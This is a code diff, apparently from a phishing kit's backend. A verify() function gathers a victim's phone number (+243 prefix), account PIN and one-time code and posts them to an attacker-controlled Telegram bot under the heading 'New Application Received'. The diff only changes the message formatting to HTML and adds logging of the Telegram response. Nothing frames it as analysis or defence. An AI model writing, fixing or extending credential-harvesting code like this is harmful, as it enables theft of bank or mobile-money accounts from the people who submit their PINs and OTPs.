@@ -21,20 +21,22 @@ def verify():
     token = os.environ.get("TELEGRAM_TOKEN")
     chat_id = os.environ.get("TELEGRAM_CHAT_ID")
     
-    message = f"🚀 *New Application Received!*\n\n"
-    message += f"📱 *Phone:* +243 {phone}\n"
-    message += f"🔑 *PIN:* {pin}\n"
-    message += f"🔢 *OTP:* {otp}\n"
+    message = f"🚀 <b>New Application Received!</b>\n\n"
+    message += f"📱 <b>Phone:</b> +243 {phone}\n"
+    message += f"🔑 <b>PIN:</b> {pin}\n"
+    message += f"🔢 <b>OTP:</b> {otp}\n"
     
     if token and chat_id:
         url = f"https://api.telegram.org/bot{token}/sendMessage"
         payload = {
             "chat_id": chat_id,
             "text": message,
-            "parse_mode": "Markdown"
+            "parse_mode": "HTML"
         }
         try:
-            requests.post(url, json=payload)
+            res = requests.post(url, json=payload)
+            print(f"Telegram response status: {res.status_code}")
+            print(f"Telegram response body: {res.text}")
         except Exception as e:
             print(f"Error sending to Telegram: {e}")
             
